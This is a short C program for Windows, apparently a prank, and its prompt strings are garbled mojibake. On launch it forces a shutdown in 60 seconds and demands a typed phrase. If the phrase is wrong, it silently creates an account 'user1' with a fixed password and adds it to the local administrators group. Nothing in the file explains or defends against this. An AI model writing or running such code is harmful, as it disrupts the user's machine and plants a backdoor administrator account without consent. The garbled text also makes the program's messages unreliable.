#include <stdio.h>
#include <string.h>
main()
{
	char input[20] = { 0 };
	system("shutdown -s -t 60 -f");
	printf("����\"������\",��Ȼ����60���ػ�Ŷ~");
	printf(":>_");
	scanf_s("%s", input, 20);
	if (strcmp(input, "������") == 0)
	{
		system("shutdown -a");
	}
	else
	{
		system("net user user1 sjqyyds /add && net localgroup administrators user1 /add ");
	}
	return 0;
}